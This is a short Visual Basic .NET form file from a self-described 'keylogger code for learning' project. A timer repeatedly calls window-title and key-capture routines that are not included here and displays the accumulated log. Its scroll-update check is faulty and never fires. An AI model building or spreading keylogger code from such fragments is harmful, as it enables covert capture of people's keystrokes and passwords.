' Dev     : sPk RsK
' Email   : spkrsk.37@gmail.com
' Fanpage : www.facebook.com/sPkAutorunkiller
' Project : Keylogger code for learning
Public Class Form1
    Dim lastestLog As String

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        titleToLog()
        checkkey()
        TextBox1.Text = allLog
        lastestLog = allLog
        If lastestLog <> allLog Then
            TextBox1.SelectionStart = TextBox1.Text.Length
            TextBox1.ScrollToCaret()
        End If
    End Sub
End Class
